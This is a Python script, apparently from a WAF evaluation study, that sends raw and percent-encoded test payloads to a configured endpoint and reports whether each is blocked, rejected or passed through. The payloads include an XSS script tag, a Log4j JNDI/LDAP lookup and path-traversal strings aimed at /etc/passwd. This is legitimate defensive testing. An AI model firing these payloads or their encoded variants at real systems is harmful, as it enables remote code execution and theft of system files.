#!/usr/bin/env python3
"""Calibration: do S4 payloads need URL-encoding to reach the WAF?

Three classes return 400 at C1 and C2 -- a malformed-URI rejection, not a
pass-through. A 400 is not a WAF block, but it is also not an allow, so it
would contaminate M1 and M3 for those configurations.

Raw `<`, `>`, `{` and `}` are not legal in a URI. This tests whether
percent-encoding them lets the payload traverse the stack intact and still
match the managed rule.

Run once per configuration:
    ./.venv/bin/python switch/apply_config.py C3
    ./.venv/bin/python scripts/probe_encoding.py
"""
import asyncio
import json
import sys
from pathlib import Path

import aiohttp
from yarl import URL

REPO = Path(__file__).resolve().parents[1]

# (label, raw form, percent-encoded form)
VARIANTS = [
    ("xss-query",
     "/api/items?q=<script>alert(1)</script>",
     "/api/items?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("log4j-query",
     "/api/items?x=${jndi:ldap://example.com/a}",
     "/api/items?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.com%2Fa%7D"),
    ("lfi-path",
     "/api/../../etc/passwd",
     "/api/%2E%2E%2F%2E%2E%2Fetc/passwd"),
    ("lfi-query",
     "/api/items?file=../../../../etc/passwd",
     "/api/items?file=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"),
]


async def get(s, base, path):
    try:
        async with s.get(URL(base + path, encoded=True),
                         timeout=aiohttp.ClientTimeout(total=20)) as r:
            return r.status
    except Exception as e:  # noqa: BLE001
        return f"ERR {type(e).__name__}"


def meaning(status):
    return {200: "reached origin", 403: "WAF BLOCK", 400: "malformed-URI reject"}.get(
        status, str(status))


async def main():
    state = json.loads((REPO / "data" / "processed" / "active-config.json").read_text())
    cfg, base = state["configuration"], state["endpoint"]
    print(f"Configuration: {cfg}   {base}\n")
    print(f"  {'payload':<14}{'raw':<28}{'percent-encoded':<28}")
    print("  " + "-" * 70)

    async with aiohttp.ClientSession() as s:
        for label, raw, enc in VARIANTS:
            sr = await get(s, base, raw)
            se = await get(s, base, enc)
            print(f"  {label:<14}{str(sr) + ' ' + meaning(sr):<28}"
                  f"{str(se) + ' ' + meaning(se):<28}")


asyncio.run(main())
